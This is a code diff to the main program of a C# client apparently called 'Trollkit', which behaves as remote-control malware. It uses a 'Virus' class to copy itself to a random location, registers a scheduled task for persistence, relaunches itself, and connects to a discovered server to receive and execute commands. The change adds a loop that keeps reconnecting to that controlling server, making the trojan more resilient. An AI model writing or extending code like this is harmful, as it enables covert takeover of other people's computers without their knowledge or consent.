@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Net.Sockets;
+using System.Threading;
 using System.Threading.Tasks;
 using Trollkit_Client.Modules;
 using Trollkit_Client.Modules.CommandHandlers;
@@ -23,22 +24,24 @@ namespace Trollkit_Client
 			if (args.Length > 0)
 				if(args[0] == "move-completed")
 				{
-					BConsole.WriteLine("Application has been moved to a different location...");
-					var program = new Program();
-					var addresses = program.discover.GetIpAddresses();
-					string ip = program.discover.GetRemoteServerIp(addresses);
-					bool crashed = false;
+					BConsole.WriteLine("Application has been moved to a different location...", ConsoleColor.Yellow);			
+					bool attemptReconnect = true;
 					Task.Run(() => {
-						program.receiver.ConnectAndReceive(ip);
-						crashed = true;
+						while (attemptReconnect)
+						{
+							var program = new Program();
+							var addresses = program.discover.GetIpAddresses();
+							string ip = program.discover.GetRemoteServerIp(addresses);
+							attemptReconnect = program.receiver.ConnectAndReceive(ip);
+						}
+						BConsole.WriteLine("Connection closed. Program halted.", ConsoleColor.Red);
+						Thread.Sleep(4000);
+						return;
 					});
 
-					while(!crashed)
+					while(true)
 						Console.ReadLine();
-
-					return;
 				}
-
 
 			Virus virus = new Virus();
 			string randomLocation = virus.FindRandomFileLocation();
@@ -47,9 +50,6 @@ namespace Trollkit_Client
 			new TaskSchedulerHelper().CreateTask(newFileLocation);
 
 			Process.Start(newFileLocation, "move-completed");
-
-			//Enable below if you want to debug
-			//Console.Read();
 		}
 
 		public Program()
@@ -74,11 +74,11 @@ namespace Trollkit_Client
 				{
 					if (handlers[Object.Handler].HandleCommand(s, Object))
 					{
-						BConsole.WriteLine($"Command '{Object.Command}' executed successfully", ConsoleColor.Green);
+						BConsole.WriteLine($"Command '{Object.Command}' executed successfully.", ConsoleColor.Green);
 					}
 					else
 					{
-						BConsole.WriteLine($"Command '{Object.Command}' could not be executed", ConsoleColor.Red);
+						BConsole.WriteLine($"Command '{Object.Command}' could not be executed.", ConsoleColor.Red);
 					}
 				}
 				else
